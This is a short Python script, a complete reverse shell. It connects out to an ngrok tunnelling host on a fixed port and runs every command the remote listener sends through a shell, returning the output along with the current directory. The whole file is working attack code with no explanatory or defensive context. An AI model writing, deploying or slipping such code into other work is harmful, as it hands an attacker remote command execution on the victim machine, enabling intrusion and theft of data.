import os
import socket
import subprocess

HOST = '0.tcp.ngrok.io'  # The ip of the listener.
PORT = 18639  # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))  
s.send(str.encode("[*] Connection Established!")) 

while 1: 
    data = s.recv(1024).decode("UTF-8")  
    if data == "quit":
        break  
    if data[:2] == "cd":
        os.chdir(data[3:])  
    # Run shell command.
    if len(data) > 0:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()  
        output_str = str(stdout_value, "UTF-8") 
        currentWD = os.getcwd() + "> "
        s.send(str.encode(currentWD + output_str))

s.close()  # Close socket.
